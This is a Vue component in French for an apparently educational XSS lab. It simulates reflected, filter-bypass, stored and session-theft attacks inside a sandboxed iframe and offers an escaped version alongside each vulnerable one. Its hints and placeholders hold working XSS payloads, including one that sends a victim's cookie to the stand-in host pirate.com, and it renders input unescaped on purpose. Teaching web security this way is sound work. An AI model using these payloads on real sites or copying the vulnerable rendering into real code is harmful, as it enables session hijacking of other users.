<template>
  <div class="xlab">
    <!-- ============================================ DÉMO RÉFLÉCHIE -->
    <template v-if="type === 'reflechie'">
      <p class="intro">
        Un mini-site qui affiche une image dont l'adresse vient d'un champ. Derrière, il colle votre
        saisie dans une balise <code>&lt;img src="…"&gt;</code>, sans la filtrer.
      </p>
      <div class="mode">
        <label><input type="radio" value="vulnerable" v-model="mode" /> Version vulnérable (saisie collée telle quelle)</label>
        <label><input type="radio" value="corrige" v-model="mode" /> Version corrigée (htmlspecialchars)</label>
      </div>
      <div class="form">
        <label>Adresse de l'image
          <input v-model="valeur" spellcheck="false" placeholder='https://exemple.fr/chat.png' />
        </label>
        <button @click="render">Afficher l'image</button>
      </div>
      <div class="exemples" v-if="mode === 'vulnerable'">
        Essayez une injection :
        <button class="link" @click="valeur = 'x&quot; onerror=&quot;alert(\'XSS\')'; render()">
          <code>x" onerror="alert('XSS')</code>
        </button>
      </div>
    </template>

    <!-- ============================================ DÉMO STOCKÉE (livre d'or + vol de session) -->
    <template v-else-if="type === 'livre'">
      <p class="intro">
        Un livre d'or : chaque message est <strong>enregistré</strong>, puis réaffiché à
        <strong>tous</strong> les visiteurs. Postez un message, puis rechargez la page « dans le
        navigateur de Bob » pour voir ce que <em>lui</em> reçoit.
      </p>
      <div class="mode">
        <label><input type="radio" value="vulnerable" v-model="mode" /> Version vulnérable</label>
        <label><input type="radio" value="corrige" v-model="mode" /> Version corrigée (htmlspecialchars)</label>
      </div>
      <div class="form">
        <label class="grow">Votre message
          <input v-model="message" spellcheck="false" placeholder="Bravo pour votre site !" />
        </label>
        <button @click="poster">Publier</button>
        <button class="secondary" @click="voirCommeBob">Recharger dans le navigateur de Bob</button>
        <button class="secondary" @click="reinitLivre">Vider le livre d'or</button>
      </div>
      <p class="hint" v-if="commentaires.length">
        {{ commentaires.length }} message{{ commentaires.length > 1 ? 's' : '' }} enregistré{{ commentaires.length > 1 ? 's' : '' }}.
        La vue ci-dessous est celle de <strong>{{ vueBob ? 'Bob (connecté, cookie de session actif)' : 'vous' }}</strong>.
      </p>
    </template>

    <!-- ============================================ ÉPREUVES -->
    <template v-else-if="type === 'defis'">
      <div class="picker">
        <label>Épreuve :
          <select v-model="defiId">
            <option v-for="(d, i) in DEFIS" :key="d.id" :value="d.id">{{ i + 1 }}. {{ d.titre }}</option>
          </select>
        </label>
      </div>
      <div class="journal">
        <strong>Progression</strong>
        <span v-for="d in DEFIS" :key="d.id" class="etape" :class="{ ok: resolus[d.id] }">
          {{ resolus[d.id] ? '✔ ' + d.titre : d.titre }}
        </span>
      </div>
      <div v-if="defi" class="brief">
        <p><strong>Scénario.</strong> {{ defi.scenario }}</p>
        <p class="objectif"><strong>Objectif :</strong> {{ defi.objectif }}</p>
        <div class="mode">
          <label><input type="radio" value="vulnerable" v-model="mode" /> Page vulnérable</label>
          <label><input type="radio" value="corrige" v-model="mode" /> La même, affichage échappé</label>
        </div>
        <div class="form">
          <label class="grow">{{ defi.champ }}
            <input v-model="saisies[defiId]" spellcheck="false" :placeholder="defi.placeholder" />
          </label>
          <button @click="jouerDefi">{{ defi.bouton || 'Envoyer' }}</button>
          <button v-if="defi.commentaires" class="secondary" @click="voirCommeBob">Ouvrir chez Bob</button>
          <button class="secondary" @click="montrerIndice">Coup de pouce</button>
        </div>
      </div>
    </template>

    <!-- ============================================ affichage commun -->
    <div v-if="source" class="requete">
      <span class="requete-label">HTML réellement produit par le serveur :</span>
      <pre>{{ source }}</pre>
    </div>

    <div class="ecran">
      <div class="ecran-barre">🌐 navigateur {{ vueBob ? '— session : Bob' : '' }}</div>
      <iframe ref="frame" sandbox="allow-scripts" :srcdoc="doc"></iframe>
    </div>

    <div v-if="pirate.length" class="pirate">
      <strong>🕵️ Serveur de l'attaquant (pirate.com) — requêtes reçues :</strong>
      <pre v-for="(p, i) in pirate" :key="i">{{ p }}</pre>
    </div>

    <div v-if="verdict" class="verdict" :class="verdict.ok ? 'ok' : 'ko'">
      <p>{{ verdict.texte }}</p>
    </div>
  </div>
</template>

<script setup>
import { ref, reactive, computed, watch, onMounted, onBeforeUnmount } from 'vue'

const props = defineProps({ type: { type: String, default: 'reflechie' } })
const STORAGE_KEY = 'xss-lab:defis'
const COOKIE_BOB = 'session=BOB-9f3a7c21e0; theme=sombre'

const DEFIS = [
  {
    id: 'reflechie',
    titre: 'XSS réfléchie',
    scenario: "Un champ « adresse de l'image » recopiée dans une balise <img src=\"…\">.",
    objectif: "Faites s'exécuter du JavaScript (déclenchez une alerte).",
    champ: "Adresse de l'image",
    placeholder: 'x" onerror="alert(1)',
    bouton: "Afficher l'image",
    kind: 'img',
    indice: "Le serveur écrit <img src=\"VOTRE_SAISIE\">. Fermez l'attribut avec un guillemet, puis ajoutez un gestionnaire : x\" onerror=\"alert(1)",
  },
  {
    id: 'filtre',
    titre: 'Contourner un filtre naïf',
    scenario: "Ce livre d'or retire les balises <script> avant d'afficher. Beaucoup de développeurs croient être protégés ainsi.",
    objectif: "Exécutez du JavaScript malgré le filtre anti-<script>.",
    champ: 'Votre message',
    placeholder: "<img src=x onerror=alert(1)>",
    kind: 'strip',
    indice: "Le filtre ne retire QUE les balises <script>. Une balise <img> avec onerror n'est pas filtrée : <img src=x onerror=alert(1)>",
  },
  {
    id: 'stockee',
    titre: 'XSS stockée',
    scenario: "Un livre d'or classique. Votre message est enregistré et réaffiché à chaque visiteur.",
    objectif: "Publiez un message qui s'exécute chez un AUTRE visiteur (Bob). Publiez, puis « Ouvrir chez Bob ».",
    champ: 'Votre message',
    placeholder: "<script>alert('stockée')<\/script>",
    bouton: 'Publier',
    kind: 'store',
    commentaires: true,
    indice: "Ici rien n'est filtré : un <script>alert(1)<\/script> suffit. Publiez-le, puis cliquez « Ouvrir chez Bob » : il s'exécute dans SON navigateur, pas seulement le vôtre.",
  },
  {
    id: 'cookie',
    titre: 'Vol de session',
    scenario: "Même livre d'or, mais Bob est connecté : son navigateur détient un cookie de session. L'attaquant veut ce cookie.",
    objectif: "Publiez un message qui envoie le cookie de Bob vers pirate.com. Publiez, puis « Ouvrir chez Bob ».",
    champ: 'Votre message',
    placeholder: '<img src=x onerror="new Image().src=\'https://pirate.com/?c=\'+document.cookie">',
    bouton: 'Publier',
    kind: 'store',
    commentaires: true,
    cookie: true,
    indice: "document.cookie contient la session. Exfiltrez-le en le collant dans l'URL d'une image vers le serveur pirate : <img src=x onerror=\"new Image().src='https://pirate.com/?c='+document.cookie\">",
  },
]

const mode = ref('vulnerable')
const valeur = ref('')
const message = ref('')
const defiId = ref('reflechie')
const saisies = reactive({})
const commentaires = ref([])
const vueBob = ref(false)
const doc = ref('')
const source = ref('')
const verdict = ref(null)
const pirate = ref([])
const resolus = ref({})
const frame = ref(null)

const defi = computed(() => DEFIS.find((d) => d.id === defiId.value))

function escapeHtml(s) {
  return String(s)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&#39;')
}

// Petit "serveur" injecté dans l'iframe : simule alert() et le cookie, intercepte les exfiltrations.
function harness(cookie) {
  return `<script>(function(){
    window.__c=${JSON.stringify(cookie || '')};
    try{Object.defineProperty(document,'cookie',{get:function(){return window.__c},set:function(v){window.__c=v},configurable:true})}catch(e){}
    function hit(k,d){parent.postMessage({__xss:1,kind:k,data:String(d==null?'':d)},'*')}
    ['alert','confirm','prompt'].forEach(function(f){window[f]=function(m){hit('js',m);return true}});
    var I=window.Image;window.Image=function(){var o={};Object.defineProperty(o,'src',{set:function(v){hit('exfil',v)},get:function(){return''}});return o};
    window.fetch=function(u){hit('exfil',u);return Promise.resolve({})};
    if(navigator.sendBeacon)navigator.sendBeacon=function(u,d){hit('exfil',u+' '+(d==null?'':d));return true};
    window.onerror=function(){return true};
  })()<\/script>`
}

const PAGE_CSS = `<style>body{font-family:system-ui,sans-serif;margin:0;padding:12px;color:#1b1b1f}
h3{margin:0 0 8px;font-size:15px}ul{padding-left:0;list-style:none;margin:0}
li,.c{background:#f5f5f7;border-radius:6px;padding:8px 10px;margin:6px 0}img{max-width:120px;height:auto}</style>`

// Construit le HTML de la page vulnérable ou corrigée selon l'épreuve/la démo.
function build(kind, payload, comments, cookie) {
  const corrige = mode.value === 'corrige'
  let body = ''
  if (kind === 'img') {
    const v = corrige ? escapeHtml(payload) : payload
    body = `<h3>Aperçu de l'image</h3><img src="${v}" alt="aperçu">`
  } else if (kind === 'strip') {
    // Filtre naif : retire seulement les balises de type script (voir le regex ci-dessous)
    let v = corrige ? escapeHtml(payload) : payload.replace(/<script[^>]*>[\s\S]*?<\/script>/gi, '')
    body = `<h3>Message publié</h3><div class="c">${v}</div>`
  } else {
    // store : livre d'or, tous les messages enregistrés
    const items = (comments || []).map((m) => `<div class="c">${corrige ? escapeHtml(m) : m}</div>`).join('')
    body = `<h3>Livre d'or</h3>${items || '<p style="color:#888">Aucun message pour l\'instant.</p>'}`
  }
  return `<!doctype html><html><head><meta charset="utf-8">${PAGE_CSS}</head><body>${harness(cookie)}${body}</body></html>`
}

function currentKind() {
  if (props.type === 'reflechie') return 'img'
  if (props.type === 'livre') return 'store'
  return defi.value.kind
}

function render(asBob = false) {
  vueBob.value = asBob
  pirate.value = []
  verdict.value = null
  const kind = currentKind()
  const cookie = asBob ? COOKIE_BOB : ''
  let payload = ''
  let comments = commentaires.value
  if (props.type === 'reflechie') payload = valeur.value
  else if (props.type === 'defis' && kind !== 'store') payload = saisies[defiId.value] || ''
  doc.value = build(kind, payload, comments, cookie)
  // Montre le HTML produit (utile pédagogiquement)
  if (kind === 'img') {
    const v = mode.value === 'corrige' ? escapeHtml(payload) : payload
    source.value = `<img src="${v}">`
  } else if (kind === 'strip') {
    source.value = `<div>${mode.value === 'corrige' ? escapeHtml(payload) : payload.replace(/<script[^>]*>[\s\S]*?<\/script>/gi, '')}</div>`
  } else {
    source.value = ''
  }
}

function poster() {
  if (!message.value.trim()) return
  commentaires.value.push(message.value)
  message.value = ''
  render(false)
}

function voirCommeBob() {
  if (props.type === 'defis') {
    const m = saisies[defiId.value]
    if (m && m.trim() && !commentaires.value.includes(m)) commentaires.value.push(m)
  }
  render(true)
}

function reinitLivre() {
  commentaires.value = []
  render(false)
}

function jouerDefi() {
  const d = defi.value
  if (d.kind === 'store') {
    const m = saisies[defiId.value]
    if (m && m.trim() && !commentaires.value.includes(m)) commentaires.value.push(m)
    render(false)
    verdict.value = { ok: false, texte: 'Message publié. Cliquez « Ouvrir chez Bob » pour voir ce qu\'il déclenche chez un autre visiteur.' }
  } else {
    render(false)
  }
}

function montrerIndice() {
  verdict.value = { ok: false, texte: 'Coup de pouce : ' + defi.value.indice }
}

function marquerResolu(id) {
  if (resolus.value[id]) return
  resolus.value = { ...resolus.value, [id]: true }
  try {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(Object.keys(resolus.value).filter((k) => resolus.value[k])))
  } catch (e) {}
}

function onMessage(e) {
  const d = e.data
  if (!d || d.__xss !== 1) return
  if (props.type === 'reflechie') {
    if (mode.value === 'vulnerable') verdict.value = { ok: true, texte: 'Le JavaScript s\'est exécuté : votre saisie est devenue du code. C\'est une XSS réfléchie.' }
    return
  }
  if (props.type === 'livre') {
    if (d.kind === 'exfil') {
      pirate.value.push('GET ' + d.data)
      verdict.value = { ok: true, texte: 'Le cookie de session de Bob vient de partir vers pirate.com. Avec lui, l\'attaquant se connecte à sa place, sans mot de passe.' }
    } else if (d.kind === 'js') {
      verdict.value = { ok: true, texte: 'Le code s\'est exécuté dans le navigateur de Bob : un seul message piégé touche tous les visiteurs. C\'est une XSS stockée.' }
    }
    return
  }
  // défis
  const dfi = defi.value
  if (mode.value === 'corrige') return // en mode corrigé, une exécution ne devrait pas arriver
  if (dfi.cookie) {
    if (d.kind === 'exfil' && String(d.data).includes('BOB-9f3a7c21e0')) {
      pirate.value.push('GET ' + d.data)
      verdict.value = { ok: true, texte: 'Réussi ! Le cookie de session de Bob est arrivé sur pirate.com. Vous pourriez maintenant usurper sa session.' }
      marquerResolu(dfi.id)
    } else if (d.kind === 'exfil') {
      pirate.value.push('GET ' + d.data)
      verdict.value = { ok: false, texte: 'Une requête est partie vers le pirate, mais sans le cookie. Ajoutez +document.cookie à l\'URL.' }
    }
    return
  }
  if (d.kind === 'js' || d.kind === 'exfil') {
    const besoinBob = dfi.kind === 'store'
    if (besoinBob && !vueBob.value) {
      verdict.value = { ok: false, texte: 'Le code s\'exécute, mais chez vous. Le but est qu\'il s\'exécute chez un autre visiteur : cliquez « Ouvrir chez Bob ».' }
      return
    }
    verdict.value = { ok: true, texte: 'Réussi ! Votre saisie a été exécutée comme du code par le navigateur.' }
    marquerResolu(dfi.id)
  }
}

watch(mode, () => render(vueBob.value))
watch(defiId, () => { verdict.value = null; pirate.value = []; commentaires.value = []; render(false) })

onMounted(() => {
  try {
    const p = JSON.parse(localStorage.getItem(STORAGE_KEY) || 'null')
    if (Array.isArray(p)) resolus.value = Object.fromEntries(p.map((id) => [id, true]))
  } catch (e) {}
  window.addEventListener('message', onMessage)
  render(false)
})
onBeforeUnmount(() => window.removeEventListener('message', onMessage))
</script>

<style scoped>
.xlab {
  border: 1px solid var(--vp-c-divider);
  border-radius: 8px;
  padding: 1rem;
  margin: 1rem 0;
  background: var(--vp-c-bg-soft);
}
.intro { margin-top: 0; }
.mode { display: flex; flex-wrap: wrap; gap: 1rem; margin: 0.6rem 0; font-size: 0.9em; }
.form { display: flex; flex-wrap: wrap; gap: 0.6rem; align-items: flex-end; margin: 0.6rem 0; }
.form label { display: flex; flex-direction: column; gap: 0.2rem; font-size: 0.85em; color: var(--vp-c-text-2); }
.form label.grow { flex: 1 1 22rem; }
.form input {
  padding: 0.35rem 0.5rem; border: 1px solid var(--vp-c-divider); border-radius: 4px;
  background: var(--vp-c-bg); color: var(--vp-c-text-1);
  font-family: var(--vp-font-family-mono); font-size: 0.9em; width: 100%;
}
.exemples, .hint { font-size: 0.85em; color: var(--vp-c-text-2); margin: 0.3rem 0; }
.picker select { margin-left: 0.5rem; padding: 0.3rem 0.5rem; border: 1px solid var(--vp-c-divider); border-radius: 4px; background: var(--vp-c-bg); color: var(--vp-c-text-1); }
.brief { margin-top: 0.6rem; }
.brief p { margin: 0.3rem 0; }
button {
  padding: 0.4rem 0.9rem; border-radius: 4px; border: 1px solid var(--vp-c-brand-1);
  background: var(--vp-c-brand-1); color: #fff; cursor: pointer;
}
button.secondary { background: transparent; color: var(--vp-c-brand-1); }
button.link { background: none; border: none; padding: 0; color: var(--vp-c-brand-1); text-decoration: underline; cursor: pointer; font-size: inherit; }
.requete { margin-top: 0.6rem; }
.requete-label { font-size: 0.8em; color: var(--vp-c-text-2); }
.requete pre {
  margin: 0.2rem 0 0; padding: 0.6rem; border-radius: 4px; background: var(--vp-c-bg);
  border: 1px solid var(--vp-c-divider); font-size: 0.85em; overflow-x: auto; white-space: pre-wrap;
}
.ecran { margin-top: 0.6rem; border: 1px solid var(--vp-c-divider); border-radius: 6px; overflow: hidden; }
.ecran-barre { background: var(--vp-c-bg); padding: 0.3rem 0.6rem; font-size: 0.8em; color: var(--vp-c-text-2); border-bottom: 1px solid var(--vp-c-divider); }
.ecran iframe { width: 100%; height: 12rem; border: 0; background: #fff; display: block; }
.pirate {
  margin-top: 0.6rem; padding: 0.7rem 0.9rem; border-radius: 6px;
  border-left: 4px solid var(--vp-c-danger-1); background: var(--vp-c-danger-soft); font-size: 0.85em;
}
.pirate pre { margin: 0.3rem 0 0; white-space: pre-wrap; word-break: break-all; }
.verdict { margin-top: 0.6rem; padding: 0.7rem 0.9rem; border-radius: 6px; border-left: 4px solid var(--vp-c-danger-1); background: var(--vp-c-danger-soft); }
.verdict.ok { border-left-color: var(--vp-c-success-1); background: var(--vp-c-success-soft); }
.verdict p { margin: 0; font-weight: 600; }
.journal { margin: 0.8rem 0; display: flex; flex-wrap: wrap; gap: 0.5rem; align-items: center; font-size: 0.9em; }
.etape { padding: 0.15rem 0.6rem; border-radius: 999px; border: 1px dashed var(--vp-c-divider); color: var(--vp-c-text-2); }
.etape.ok { border-style: solid; border-color: var(--vp-c-success-1); color: var(--vp-c-success-1); }
</style>
